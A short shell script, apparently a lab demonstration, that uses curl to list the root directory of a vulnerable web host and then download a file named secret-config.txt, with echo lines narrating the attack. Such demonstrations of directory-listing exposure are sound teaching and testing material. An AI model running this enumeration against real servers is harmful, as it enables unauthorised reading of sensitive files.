
#!/bin/sh
# Simple attacker script that demonstrates enumerating files via directory listing
TARGET_URL="http://vuln-web"

echo "[*] Starting simple directory scan demo against $TARGET_URL"
echo "[*] Fetching root listing..."
curl -sS $TARGET_URL/ | sed -n '1,200p'

echo
echo "[*] Now trying to fetch discovered file: secret-config.txt"
curl -sS $TARGET_URL/secret-config.txt || true

echo
echo "[*] Done. In a real attack, an attacker could automate deeper scans and download sensitive files."
